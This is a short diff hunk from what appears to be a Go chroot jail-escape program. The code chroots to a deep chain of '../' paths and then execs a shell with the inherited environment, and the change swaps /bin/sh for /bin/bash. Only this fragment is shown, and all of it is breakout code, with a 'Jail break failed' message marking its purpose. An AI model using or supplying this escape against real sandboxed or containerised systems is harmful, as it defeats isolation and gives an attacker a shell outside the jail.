@@ -18,7 +18,7 @@ func main() {
 	if err := syscall.Chroot("../../../../../../../../../../../../../../../.."); err != nil {
 		fmt.Println("Jail break failed")
 	}
-	if err := syscall.Exec("/bin/sh", []string{""}, os.Environ()); err != nil {
+	if err := syscall.Exec("/bin/bash", []string{""}, os.Environ()); err != nil {
 		fmt.Println(err)
 		fmt.Println("Exec failed")
 	}
